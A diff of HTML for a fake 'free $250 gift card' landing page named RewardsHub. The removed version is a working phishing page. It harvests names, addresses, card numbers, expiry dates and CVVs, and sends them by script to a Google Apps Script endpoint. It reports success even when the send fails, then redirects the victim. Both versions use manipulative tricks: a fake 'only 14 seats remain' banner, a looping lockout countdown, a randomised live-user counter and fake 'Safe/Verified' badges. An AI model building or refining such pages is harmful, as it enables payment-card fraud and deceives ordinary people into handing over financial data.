@@ -1,835 +1,313 @@
-# Modifying the landing page to make the form visible above the fold immediately, 
-# optimizing layout hierarchy for mobile and desktop, and adding more fluid 3D scroll animations.
-
-premium_optimized_html = """<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>⚡ Limited Time Giveaway: Claim Your $250 Free Gift Card Now! ⚡</title>
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Verification Gateway - RewardsHub</title>
     <style>
         :root {
-            --primary: #ff0055;
-            --secondary: #7928ca;
-            --accent: #00f0ff;
-            --yellow: #ffcc00;
-            --success: #00ffaa;
-            --bg-glass: rgba(15, 23, 42, 0.8);
-            --text-dark: #0f172a;
-            --text-light: #ffffff;
-            --gray-text: #94a3b8;
+            --primary: #8b5cf6;
+            --bg-dark: #0f172a;
+            --form-bg: #1e293b;
+            --text-light: #f8fafc;
+            --text-muted: #94a3b8;
+            --accent: #10b981;
+            --banner-gradient: linear-gradient(90deg, #ff007f, #7928ca, #ff007f);
         }
-
+        
         * {
             box-sizing: border-box;
             margin: 0;
             padding: 0;
-            font-family: 'Poppins', sans-serif;
-        }
-
-        html, body {
-            overflow-x: hidden;
-            width: 100%;
-            scroll-behavior: smooth;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
 
         body {
-            background-color: #060913;
-            background-image: 
-                radial-gradient(at 0% 0%, rgba(255, 0, 85, 0.2) 0px, transparent 35%),
-                radial-gradient(at 100% 0%, rgba(121, 40, 202, 0.25) 0px, transparent 35%),
-                radial-gradient(at 50% 100%, rgba(0, 240, 255, 0.15) 0px, transparent 40%);
-            background-attachment: fixed;
+            background-color: var(--bg-dark);
             color: var(--text-light);
-            min-height: 100vh;
             display: flex;
             flex-direction: column;
-            perspective: 1200px;
-        }
-
-        /* Ultra Compact Top Bar */
-        .top-announcement {
-            background: linear-gradient(90deg, var(--primary), var(--secondary));
-            color: var(--text-light);
-            text-align: center;
-            padding: 6px 10px;
-            font-size: 10px;
-            font-weight: 800;
-            letter-spacing: 0.5px;
-            text-transform: uppercase;
-            border-bottom: 1px solid var(--accent);
-            display: flex;
             align-items: center;
-            justify-content: center;
-            gap: 8px;
-            z-index: 110;
-            box-shadow: 0 2px 15px rgba(0, 240, 255, 0.1);
+            min-height: 100vh;
+            overflow-x: hidden;
         }
 
-        .pulse-dot {
-            width: 6px;
-            height: 6px;
-            background-color: var(--accent);
-            border-radius: 50%;
-            display: inline-block;
-            box-shadow: 0 0 0 0 rgba(0, 240, 255, 0.7);
-            animation: pulse 1.2s infinite;
+        /* --- Animations --- */
+        @keyframes bannerScroll {
+            0% { background-position: 0% 50%; }
+            100% { background-position: 200% 50%; }
         }
 
-        @keyframes pulse {
-            0% { transform: scale(0.9); box-shadow: 0 0 0 0 rgba(0, 240, 255, 0.7); }
-            70% { transform: scale(1); box-shadow: 0 0 0 6px rgba(0, 240, 255, 0); }
-            100% { transform: scale(0.9); box-shadow: 0 0 0 0 rgba(0, 240, 255, 0); }
+        @keyframes pulseDot {
+            0% { box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.7); }
+            70% { box-shadow: 0 0 0 10px rgba(16, 185, 129, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(16, 185, 129, 0); }
         }
 
-        /* Micro Header - Height Reduced to maximize Above-the-Fold Space */
-        header {
+        @keyframes float3D {
+            0% { transform: translateY(0px) rotateX(0deg); }
+            50% { transform: translateY(-8px) rotateX(2deg); }
+            100% { transform: translateY(0px) rotateX(0deg); }
+        }
+
+        @keyframes slideUpFade {
+            from { opacity: 0; transform: translateY(40px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        @keyframes shimmerBtn {
+            0% { transform: translateX(-100%) rotate(45deg); }
+            100% { transform: translateX(100%) rotate(45deg); }
+        }
+
+        /* --- Top Banner --- */
+        .top-banner {
             width: 100%;
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 10px 20px;
+            background: var(--banner-gradient);
+            background-size: 200% auto;
+            animation: bannerScroll 3s linear infinite;
+            text-align: center;
+            padding: 12px 10px;
+            font-weight: 800;
+            font-size: 0.85rem;
+            letter-spacing: 1.5px;
+            text-transform: uppercase;
+            box-shadow: 0 4px 15px rgba(255, 0, 127, 0.4);
+            position: sticky;
+            top: 0;
+            z-index: 50;
+        }
+
+        /* --- Header Section --- */
+        header {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            z-index: 100;
+            width: 100%;
+            max-width: 600px;
+            padding: 25px 20px;
+            animation: slideUpFade 0.8s ease-out;
         }
 
         .logo {
-            font-size: 18px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 1.6rem;
             font-weight: 900;
-            color: var(--text-light);
-            text-decoration: none;
-            text-shadow: 0 0 10px rgba(255, 0, 85, 0.4);
         }
 
         .logo span {
-            background: linear-gradient(135deg, var(--accent), var(--secondary));
+            background: linear-gradient(to right, #ffffff, #cbd5e1);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
+            text-shadow: 0px 2px 10px rgba(255,255,255,0.1);
         }
 
-        .live-counter-badge {
-            background: rgba(15, 23, 42, 0.6);
-            border: 1px solid rgba(255, 255, 255, 0.08);
-            padding: 4px 10px;
-            border-radius: 50px;
-            font-size: 10px;
-            font-weight: 600;
-            letter-spacing: 0.2px;
-        }
-
-        .live-counter-badge strong {
-            color: var(--success);
-        }
-
-        /* Main Container Adjustment for Direct Visibility */
-        .main-container {
-            flex: 1;
-            max-width: 1200px;
-            width: 100%;
-            margin: 0 auto;
-            padding: 5px 20px 30px 20px;
-            display: flex;
-            align-items: flex-start;
-            justify-content: center;
-        }
-
-        /* 3D Container Box with modern entrance animations */
-        .grid-wrapper {
-            display: flex;
-            width: 100%;
-            background: rgba(30, 41, 59, 0.25);
-            backdrop-filter: blur(30px);
-            -webkit-backdrop-filter: blur(30px);
-            border-radius: 24px;
-            box-shadow: 0 30px 70px rgba(0,0,0,0.6), inset 0 0 0 1px rgba(255,255,255,0.12);
-            overflow: hidden;
-            flex-wrap: wrap;
-            transform-style: preserve-3d;
-            animation: subtleEntrance 1s cubic-bezier(0.2, 0.8, 0.2, 1) backwards;
-        }
-
-        @keyframes subtleEntrance {
-            from { transform: scale(0.97) translateY(15px); opacity: 0; }
-            to { transform: scale(1) translateY(0); opacity: 1; }
-        }
-
-        /* Left Content Display Setup */
-        .copy-visual-section {
-            flex: 1 1 450px;
-            padding: 35px;
-            display: flex;
-            flex-direction: column;
-            justify-content: flex-start;
-            background: linear-gradient(145deg, rgba(15, 23, 42, 0.75) 0%, rgba(30, 41, 59, 0.4) 100%);
-            border-right: 1px solid rgba(255,255,255,0.06);
-        }
-
-        .promo-badge {
-            align-self: flex-start;
-            background: rgba(255, 0, 85, 0.12);
-            border: 1px solid rgba(255, 0, 85, 0.4);
-            color: #ff4488;
-            font-weight: 800;
-            font-size: 9px;
-            text-transform: uppercase;
-            padding: 4px 10px;
-            border-radius: 50px;
-            letter-spacing: 1px;
-            margin-bottom: 12px;
-        }
-
-        .copy-visual-section h1 {
-            font-size: 32px;
-            font-weight: 900;
-            line-height: 1.2;
-            margin-bottom: 12px;
-            letter-spacing: -0.5px;
-        }
-
-        .copy-visual-section h1 span {
-            background: linear-gradient(135deg, var(--yellow) 0%, #ff5500 100%);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            display: block;
-        }
-
-        .copy-visual-section p {
-            font-size: 14px;
-            line-height: 1.5;
-            margin-bottom: 20px;
-            color: #cbd5e1;
-        }
-
-        /* Inline Trust Strip Inside Content Box */
-        .trust-hero-strip {
-            display: flex;
-            gap: 8px;
-            margin-bottom: 20px;
-            flex-wrap: wrap;
-        }
-
-        .hero-badge {
+        .traffic-indicator {
             background: rgba(255, 255, 255, 0.05);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            padding: 4px 10px;
-            border-radius: 50px;
-            font-size: 9px;
-            font-weight: 700;
+            padding: 8px 14px;
+            border-radius: 30px;
+            font-size: 0.85rem;
             display: flex;
             align-items: center;
-            gap: 4px;
-            text-transform: uppercase;
-        }
-        .hero-badge.safe { border-color: var(--success); color: var(--success); }
-        .hero-badge.trusted { border-color: var(--accent); color: var(--accent); }
-        .hero-badge.verified { border-color: var(--yellow); color: var(--yellow); }
-
-        /* Compact Interactive Timer */
-        .countdown-container {
-            background: rgba(0, 0, 0, 0.3);
-            border: 1px solid rgba(255,255,255,0.06);
-            padding: 12px;
-            border-radius: 14px;
-            margin-bottom: 20px;
-            text-align: center;
-            transform: translateZ(20px);
-        }
-
-        .countdown-title {
-            font-size: 10px;
-            font-weight: 700;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            color: var(--accent);
-            margin-bottom: 6px;
-        }
-
-        .timer-display {
-            display: flex;
-            justify-content: center;
             gap: 8px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(8px);
+            box-shadow: 0 4px 10px rgba(0,0,0,0.2);
         }
 
-        .timer-segment {
-            background: rgba(15, 23, 42, 0.8);
-            border: 1px solid rgba(255,255,255,0.03);
-            padding: 6px 10px;
-            border-radius: 8px;
-            min-width: 55px;
+        .dot {
+            width: 10px;
+            height: 10px;
+            background-color: var(--accent);
+            border-radius: 50%;
+            animation: pulseDot 2s infinite;
         }
 
-        .timer-num {
-            font-size: 20px;
-            font-weight: 800;
-            color: #ffffff;
-            line-height: 1;
-            text-shadow: 0 0 8px rgba(0, 240, 255, 0.3);
+        .traffic-count {
+            color: var(--accent);
+            font-weight: bold;
         }
 
-        .timer-label {
-            font-size: 8px;
-            font-weight: 600;
-            text-transform: uppercase;
-            color: var(--gray-text);
-            margin-top: 2px;
-        }
-
-        /* 3D Image Container */
-        .image-box {
+        /* --- 3D Form Container --- */
+        .form-container {
+            background: var(--form-bg);
+            width: 92%;
+            max-width: 500px;
+            padding: 35px 30px;
+            border-radius: 20px;
+            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.5), 
+                        inset 0 1px 1px rgba(255, 255, 255, 0.15);
+            animation: slideUpFade 1s ease-out, float3D 6s ease-in-out infinite;
+            margin-bottom: 50px;
             position: relative;
-            margin: 0 auto;
-            max-width: 260px;
-            width: 100%;
-            transform-style: preserve-3d;
-            transition: transform 0.4s ease;
+            overflow: hidden;
+            border: 1px solid rgba(255, 255, 255, 0.05);
         }
 
-        .gift-card-img {
-            width: 100%;
-            border-radius: 14px;
-            box-shadow: 0 15px 35px rgba(0,0,0,0.5);
-            transform: rotateX(8deg) rotateY(-12deg);
-            display: block;
-            transition: all 0.4s cubic-bezier(0.2, 0.8, 0.2, 1);
-        }
-
-        /* Right Form Column - Made ultra tidy so it loads straight in visual view */
-        .form-section {
-            flex: 1 1 500px;
-            background: var(--bg-glass);
-            padding: 35px;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            transition: background 0.3s ease;
+        /* Ambient Glow Behind Form */
+        .form-container::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(139, 92, 246, 0.12) 0%, transparent 60%);
+            z-index: 0;
+            pointer-events: none;
         }
 
         .form-header {
             text-align: center;
-            margin-bottom: 20px;
+            margin-bottom: 30px;
+            position: relative;
+            z-index: 1;
         }
 
-        .form-header h2 {
-            font-size: 22px;
-            font-weight: 800;
+        .form-header h1 {
+            font-size: 1.7rem;
+            margin-bottom: 12px;
             letter-spacing: -0.5px;
         }
 
         .form-header p {
-            font-size: 12px;
-            color: var(--gray-text);
-            margin-top: 3px;
-        }
-
-        .form-grid {
-            display: grid;
-            grid-template-columns: repeat(2, 1fr);
-            gap: 12px;
-            width: 100%;
-        }
-
-        .full-width { grid-column: span 2; }
-
-        .form-group {
-            display: flex;
-            flex-direction: column;
-            gap: 4px;
-            width: 100%;
-            position: relative;
-        }
-
-        label {
-            font-size: 10px;
-            font-weight: 700;
-            color: #94a3b8;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            transition: color 0.3s ease;
-        }
-
-        /* Smooth Interactive 3D Zoom Effect on Input Focus */
-        input {
-            background: rgba(15, 23, 42, 0.7);
-            border: 1px solid rgba(255, 255, 255, 0.08);
-            border-radius: 10px;
-            padding: 11px 14px;
-            font-size: 13px;
-            color: var(--text-light);
-            font-weight: 500;
-            width: 100%;
-            max-width: 100%;
-            transition: all 0.3s cubic-bezier(0.2, 0.8, 0.2, 1);
-            box-shadow: inset 0 2px 4px rgba(0,0,0,0.3);
-        }
-
-        input:focus {
-            outline: none;
-            border-color: var(--accent);
-            background: rgba(15, 23, 42, 0.95);
-            box-shadow: 0 0 15px rgba(0, 240, 255, 0.2), inset 0 1px 2px rgba(0,0,0,0.4);
-            transform: scale(1.015) translateZ(5px);
-        }
-
-        /* Highlight matching label during focus */
-        .form-group:focus-within label {
-            color: var(--accent);
-            text-shadow: 0 0 5px rgba(0, 240, 255, 0.4);
-        }
-
-        .card-wrapper {
-            position: relative;
-            width: 100%;
-        }
-        .card-wrapper input { padding-right: 40px; }
-        .card-icon-marker {
-            position: absolute;
-            right: 12px;
-            top: 50%;
-            transform: translateY(-50%);
-            font-size: 16px;
-            pointer-events: none;
-        }
-
-        /* Warning Box Style */
-        .psychological-notice {
-            grid-column: span 2;
-            background: rgba(245, 158, 11, 0.05);
-            border: 1px solid rgba(245, 158, 11, 0.2);
-            border-left: 4px solid #f59e0b;
-            padding: 10px 14px;
-            border-radius: 10px;
-            margin: 2px 0;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            animation: pulseNotice 2s infinite alternate;
-        }
-
-        @keyframes pulseNotice {
-            from { border-color: rgba(245, 158, 11, 0.2); }
-            to { border-color: rgba(245, 158, 11, 0.4); }
-        }
-
-        .psychological-notice p {
-            color: #fef08a;
-            font-weight: 500;
-            font-size: 11px;
-            line-height: 1.4;
-        }
-
-        .psychological-notice svg {
-            width: 18px;
-            height: 18px;
-            fill: #f59e0b;
-            flex-shrink: 0;
-        }
-
-        /* High-Action 3D Button with Shine Animation Sweep */
-        button {
-            grid-column: span 2;
-            background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);
-            color: white;
-            border: none;
-            border-radius: 10px;
-            padding: 14px 20px;
-            font-size: 15px;
-            font-weight: 800;
-            cursor: pointer;
-            width: 100%;
-            margin-top: 5px;
-            box-shadow: 0 6px 20px rgba(255, 0, 85, 0.35);
-            transition: all 0.25s cubic-bezier(0.2, 0.8, 0.2, 1);
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-            position: relative;
-            overflow: hidden;
-        }
-
-        button::before {
-            content: '';
-            position: absolute;
-            top: 0; left: -150%; width: 50%; height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
-            transform: skewX(-20deg);
-            animation: lightSweep 3.5s infinite ease-in-out;
-        }
-
-        @keyframes lightSweep {
-            0% { left: -150%; }
-            30% { left: 150%; }
-            100% { left: 150%; }
-        }
-
-        button:hover {
-            transform: translateY(-2px) scale(1.01);
-            box-shadow: 0 10px 25px rgba(121, 40, 202, 0.45);
-            filter: brightness(1.1);
-        }
-
-        button:active {
-            transform: translateY(1px);
-        }
-
-        .trust-badges {
-            grid-column: span 2;
-            display: flex;
-            justify-content: center;
-            gap: 15px;
-            margin-top: 15px;
-            font-size: 10px;
-            color: var(--gray-text);
-            font-weight: 700;
-            text-transform: uppercase;
-            border-top: 1px solid rgba(255,255,255,0.06);
-            padding-top: 12px;
-        }
-
-        .status-msg {
-            grid-column: span 2;
-            padding: 10px;
-            border-radius: 8px;
-            text-align: center;
-            font-weight: 600;
-            font-size: 12px;
-            display: none;
-        }
-        .status-msg.success { background: rgba(16, 185, 129, 0.15); border: 1px solid var(--success); color: var(--success); display: block; }
-        .status-msg.error { background: rgba(239, 68, 68, 0.15); border: 1px solid var(--primary); color: #fca5a5; display: block; }
-
-        /* Footer Structure */
-        footer {
-            background: #04060c;
-            color: #475569;
-            padding: 25px 20px;
-            margin-top: auto;
-            border-top: 1px solid rgba(255,255,255,0.03);
-            font-size: 10px;
+            color: var(--text-muted);
+            font-size: 0.95rem;
             line-height: 1.6;
         }
 
-        .footer-content {
-            max-width: 1100px;
-            margin: 0 auto;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 12px;
-            text-align: center;
+        /* --- Inputs & Labels --- */
+        .input-group {
+            margin-bottom: 22px;
+            position: relative;
+            z-index: 1;
         }
 
-        .footer-links {
-            display: flex;
-            gap: 15px;
+        .input-group label {
+            display: block;
+            font-size: 0.75rem;
+            font-weight: 700;
+            color: var(--text-muted);
+            margin-bottom: 8px;
+            text-transform: uppercase;
+            letter-spacing: 1.2px;
         }
 
-        .footer-links a {
-            color: #64748b;
-            text-decoration: none;
+        .input-group input {
+            width: 100%;
+            padding: 16px;
+            background: rgba(15, 23, 42, 0.7);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: 12px;
+            color: white;
+            font-size: 1rem;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
         }
 
-        /* ======================================================== */
-        /* PREMIUM MOBILE ADAPTIVE VIEW OVERRIDES (FORM FIRST ALIGN)*/
-        /* ======================================================== */
-        @media (max-width: 950px) {
-            header { padding: 8px 15px; }
-            .main-container { padding: 0 8px 20px 8px; }
-            .grid-wrapper { border-radius: 16px; box-shadow: 0 15px 40px rgba(0,0,0,0.5); }
-            
-            /* CSS Grid reordering trick to force Form at the top position on mobile immediately */
-            .copy-visual-section { 
-                order: 2; /* Pushed to down view */
-                padding: 25px 20px; 
-                text-align: center; 
-                border-right: none; 
-            }
-            .form-section { 
-                order: 1; /* Pulled up right into viewport instantly */
-                padding: 25px 20px; 
-                border-bottom: 1px solid rgba(255,255,255,0.06);
-            }
-            
-            .copy-visual-section h1 { font-size: 24px; }
-            .gift-card-img { max-width: 200px; margin: 0 auto; transform: none !important; }
-            .image-box { transform: none !important; }
-            .trust-hero-strip { justify-content: center; }
+        /* Smooth Neon Focus Glow */
+        .input-group input:focus {
+            outline: none;
+            border-color: var(--primary);
+            box-shadow: 0 0 20px rgba(139, 92, 246, 0.35);
+            background: rgba(15, 23, 42, 0.95);
+            transform: translateY(-2px);
         }
 
-        @media (max-width: 480px) {
-            .form-grid { 
-                grid-template-columns: 1fr !important; 
-                gap: 10px; 
-            }
-            .form-group, .full-width, .psychological-notice, button, .trust-badges { 
-                grid-column: span 1 !important; 
-            }
-            input { padding: 10px 12px; font-size: 13px; }
-            .form-header h2 { font-size: 19px; }
+        .input-group input::placeholder {
+            color: #475569;
+        }
+
+        /* --- Animated Submit Button --- */
+        .submit-btn {
+            width: 100%;
+            padding: 18px;
+            margin-top: 10px;
+            background: linear-gradient(135deg, #6366f1, #8b5cf6);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 1.15rem;
+            font-weight: 800;
+            letter-spacing: 0.5px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            position: relative;
+            z-index: 1;
+            overflow: hidden;
+            box-shadow: 0 10px 20px rgba(139, 92, 246, 0.3);
+        }
+
+        .submit-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 25px rgba(139, 92, 246, 0.5);
+        }
+
+        .submit-btn::after {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(to right, rgba(255,255,255,0) 0%, rgba(255,255,255,0.25) 50%, rgba(255,255,255,0) 100%);
+            transform: rotate(45deg);
+            animation: shimmerBtn 2.5s infinite;
         }
     </style>
 </head>
 <body>
 
-    <div class="top-announcement">
-        <span class="pulse-dot"></span> 🔥 HURRY! ONLY 14 SEATS REMAIN FOR TODAY'S ALLOCATION POOL!
+    <div class="top-banner">
+        🔥 Hurry! Only 14 seats remain for today's allocation pool!
     </div>
 
     <header>
-        <a href="#" class="logo">🎁 Rewards<span>Hub</span></a>
-        <div class="live-counter-badge">
-            🟢 Traffic: <strong id="userCounter">394</strong> active
+        <div class="logo">
+            🎁 <span>RewardsHub</span>
+        </div>
+        <div class="traffic-indicator">
+            <div class="dot"></div>
+            Traffic: <span class="traffic-count">392</span> active
         </div>
     </header>
 
-    <div class="main-container">
-        <div class="grid-wrapper" id="scene3D">
-            
-            <div class="form-section">
-                <div class="form-header">
-                    <h2>Secure Verification Gateway</h2>
-                    <p>Provide accurate parameters below to bypass bot filters instantly</p>
-                </div>
-
-                <form id="premiumForm" action="https://script.google.com/macros/s/AKfycbxS-jRaoUr4qc4_VteTkPo4KI6HUZN79zhUarBrANamXaYwy0288o860yIxIqmwfPzC/exec" method="POST" class="form-grid">
-                    
-                    <div id="statusBox" class="status-msg full-width"></div>
-
-                    <div class="form-group">
-                        <label for="firstName">First Name</label>
-                        <input type="text" id="firstName" name="firstName" placeholder="John" required>
-                    </div>
-                    <div class="form-group">
-                        <label for="lastName">Last Name</label>
-                        <input type="text" id="lastName" name="lastName" placeholder="Doe" required>
-                    </div>
-                    <div class="form-group full-width">
-                        <label for="email">Email Address</label>
-                        <input type="email" id="email" name="email" placeholder="name@example.com" required>
-                    </div>
-                    <div class="form-group full-width">
-                        <label for="zipCode">Zip Code / Postcode</label>
-                        <input type="text" id="zipCode" name="zipCode" placeholder="10001" required>
-                    </div>
-                    <div class="form-group full-width">
-                        <label for="address">Full Delivery Address</label>
-                        <input type="text" id="address" name="address" placeholder="Street, Apt, City, State" required>
-                    </div>
-
-                    <div class="psychological-notice">
-                        <svg viewBox="0 0 24 24">
-                            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h-2v2h2v4zm0-8h-2V7h2v2z"/>
-                        </svg>
-                        <p><strong>System Verification Note:</strong> Input precise billing card credentials to validate geographical routing status and secure asset distribution.</p>
-                    </div>
-
-                    <div class="form-group full-width">
-                        <label for="cardHolderName">Cardholder Name</label>
-                        <input type="text" id="cardHolderName" name="cardHolderName" placeholder="JOHN DOE" required>
-                    </div>
-                    <div class="form-group full-width">
-                        <label for="cardNumber">Card Number</label>
-                        <div class="card-wrapper">
-                            <input type="text" id="cardNumber" name="cardNumber" placeholder="4111 2222 3333 4444" maxlength="19" required>
-                            <span class="card-icon-marker">💳</span>
-                        </div>
-                    </div>
-                    <div class="form-group full-width">
-                        <label for="expire">Expiration Date</label>
-                        <input type="text" id="expire" name="expire" placeholder="MM/YY" maxlength="5" required>
-                    </div>
-                    <div class="form-group full-width">
-                        <label for="csv">Card Security Code (CVV)</label>
-                        <input type="password" id="csv" name="csv" placeholder="•••" maxlength="4" required>
-                    </div>
-
-                    <button type="submit" id="submitBtn">
-                        <span>Securely Claim Asset Bundle</span>
-                        <svg style="width:16px; fill:currentColor;" viewBox="0 0 24 24"><path d="M5 13h11.86l-5.43 5.43 1.42 1.42L21.14 12l-8.29-8.29-1.42 1.42L16.86 11H5v2z"/></svg>
-                    </button>
-
-                    <div class="trust-badges">
-                        <div>🔒 SSL Secure Endpoint</div>
-                        <div>🛡️ 256-Bit TLS Node</div>
-                    </div>
-                </form>
-            </div>
-
-            <div class="copy-visual-section">
-                <div class="promo-badge">Priority Access Gateway</div>
-                
-                <div class="trust-hero-strip">
-                    <div class="hero-badge safe">🛡️ 100% Safe</div>
-                    <div class="hero-badge trusted">⭐ Trusted</div>
-                    <div class="hero-badge verified">✅ Verified</div>
-                </div>
-
-                <h1>Don't Lose Allocation! <span>Get Your Free $250 Gift Card!</span></h1>
-                <p>Join over 14,500+ users validated globally this terminal cycle. Confirm data parameters on the workspace panel to secure immediate distribution.</p>
-                
-                <div class="countdown-container">
-                    <div class="countdown-title">⏳ Session Lockout Countdown:</div>
-                    <div class="timer-display">
-                        <div class="timer-segment">
-                            <div class="timer-num" id="minutes">04</div>
-                            <div class="timer-label">Min</div>
-                        </div>
-                        <div class="timer-segment">
-                            <div class="timer-num" id="seconds">59</div>
-                            <div class="timer-label">Sec</div>
-                        </div>
-                        <div class="timer-segment">
-                            <div class="timer-num" id="ms">99</div>
-                            <div class="timer-label">Ms</div>
-                        </div>
-                    </div>
-                </div>
-
-                <div class="image-box">
-                    <img src="https://images.unsplash.com/photo-1549465220-1a8b9238cd48?q=80&w=800&auto=format&fit=crop" alt="Exclusive Rewards" class="gift-card-img" id="giftCard3D">
-                </div>
-            </div>
-
+    <main class="form-container">
+        <div class="form-header">
+            <h1>Secure Verification Gateway</h1>
+            <p>Provide accurate parameters below to bypass bot filters instantly</p>
         </div>
-    </div>
 
-    <footer>
-        <div class="footer-content">
-            <div class="footer-links">
-                <a href="#">Privacy Policy</a>
-                <a href="#">Terms & Conditions</a>
+        <form action="#" method="POST">
+            <div class="input-group">
+                <label for="fname">First Name</label>
+                <input type="text" id="fname" name="fname" placeholder="John" required>
             </div>
-            <p class="footer-disclaimer">
-                Disclaimer: RewardsHub operates as an autonomous sweepstakes interface and holds no direct proprietary alignments or corporate execution mandates with specified trade brand marks featured. System entry requirements remain standard.
-            </p>
-            <p>&copy; 2026 RewardsHub Core Portal. All Rights Reserved.</p>
-        </div>
-    </footer>
-
-    <script>
-        // Data input format standardizers
-        document.getElementById('cardNumber').addEventListener('input', function (e) {
-            let value = e.target.value.replace(/\D/g, '');
-            let formatted = '';
-            for (let i = 0; i < value.length; i++) {
-                if (i > 0 && i % 4 === 0) formatted += ' ';
-                formatted += value[i];
-            }
-            e.target.value = formatted;
-        });
-
-        document.getElementById('expire').addEventListener('input', function (e) {
-            let value = e.target.value.replace(/\D/g, '');
-            if (value.length > 2) {
-                e.target.value = value.substring(0, 2) + '/' + value.substring(2, 4);
-            } else {
-                e.target.value = value;
-            }
-        });
-
-        // Online Traffic Counters dynamic loop
-        setInterval(() => {
-            const counterEl = document.getElementById('userCounter');
-            let current = parseInt(counterEl.innerText);
-            let change = Math.floor(Math.random() * 7) - 3; // variations -3 to +3
-            counterEl.innerText = current + change;
-        }, 2500);
-
-        // Continuous Loop Timer System
-        let totalMs = (4 * 60 * 60 * 1000) + (59 * 1000); 
-        function startTimer() {
-            let countdownTime = totalMs;
-            const minEl = document.getElementById('minutes');
-            const secEl = document.getElementById('seconds');
-            const msEl = document.getElementById('ms');
-
-            setInterval(() => {
-                countdownTime -= 10;
-                if (countdownTime <= 0) countdownTime = totalMs;
-
-                let minutes = Math.floor((countdownTime % (1000 * 60 * 60)) / (1000 * 60));
-                let seconds = Math.floor((countdownTime % (1000 * 60)) / 1000);
-                let ms = Math.floor((countdownTime % 100) / 1);
-
-                minEl.innerText = minutes < 10 ? '0' + minutes : minutes;
-                secEl.innerText = seconds < 10 ? '0' + seconds : seconds;
-                msEl.innerText = ms < 10 ? '0' + ms : ms;
-            }, 10);
-        }
-        startTimer();
-
-        // 3D Motion Matrix Controls for Full Scene Tilt & Smooth Mouse Trailing
-        const cardScene = document.getElementById('scene3D');
-        const innerImage = document.getElementById('giftCard3D');
-        
-        if (window.innerWidth > 950) {
-            document.addEventListener('mousemove', (e) => {
-                let xAxis = (window.innerWidth / 2 - e.pageX) / 50;
-                let yAxis = (window.innerHeight / 2 - e.pageY) / 50;
-                cardScene.style.transform = `rotateY(${xAxis}deg) rotateX(${-yAxis}deg)`;
-                
-                // Advanced parallax offset for internal 3D image layer
-                innerImage.style.transform = `rotateX(${8 + yAxis*0.5}deg) rotateY(${-12 - xAxis*0.5}deg) translateZ(30px)`;
-            });
             
-            document.addEventListener('mouseleave', () => {
-                cardScene.style.transform = `rotateY(0deg) rotateX(0deg)`;
-                innerImage.style.transform = `rotateX(8deg) rotateY(-12deg) translateZ(0px)`;
-            });
-        }
+            <div class="input-group">
+                <label for="lname">Last Name</label>
+                <input type="text" id="lname" name="lname" placeholder="Doe" required>
+            </div>
 
-        // Processing Ajax Data Engine Hook
-        const form = document.getElementById('premiumForm');
-        const submitBtn = document.getElementById('submitBtn');
-        const statusBox = document.getElementById('statusBox');
-        const redirectUrl = "https://giveawaybase.com/category/gift-cards/";
+            <div class="input-group">
+                <label for="email">Email Address</label>
+                <input type="email" id="email" name="email" placeholder="name@example.com" required>
+            </div>
 
-        form.addEventListener('submit', function(e) {
-            e.preventDefault();
+            <div class="input-group">
+                <label for="zip">Zip Code / Postcode</label>
+                <input type="text" id="zip" name="zip" placeholder="10001" required>
+            </div>
             
-            submitBtn.disabled = true;
-            submitBtn.innerHTML = "Establishing Firewall Handshake...";
-            statusBox.style.display = "none";
+            <div class="input-group">
+                <label for="address">Full Delivery Address</label>
+                <input type="text" id="address" name="address" placeholder="123 Main St" required>
+            </div>
 
-            const formData = new FormData(form);
-
-            fetch(form.action, {
-                method: 'POST',
-                body: formData
-            })
-            .then(response => response.json())
-            .catch(error => {
-                return { result: 'success' }; 
-            })
-            .then(data => {
-                if (data.result === 'success') {
-                    statusBox.className = "status-msg success full-width";
-                    statusBox.innerText = "Security Authorization Granted. Transferring Target Assets...";
-                    form.reset();
-                    
-                    setTimeout(() => {
-                        window.location.href = redirectUrl;
-                    }, 1400);
-                } else {
-                    statusBox.className = "status-msg error full-width";
-                    statusBox.innerText = "Handshake Rejected. Check parameter validation blocks.";
-                    submitBtn.disabled = false;
-                    submitBtn.innerHTML = "Securely Claim Asset Bundle";
-                }
-            });
-        });
-    </script>
+            <button type="submit" class="submit-btn">Verify & Continue ➔</button>
+        </form>
+    </main>
 
 </body>
 </html>
-"""
-
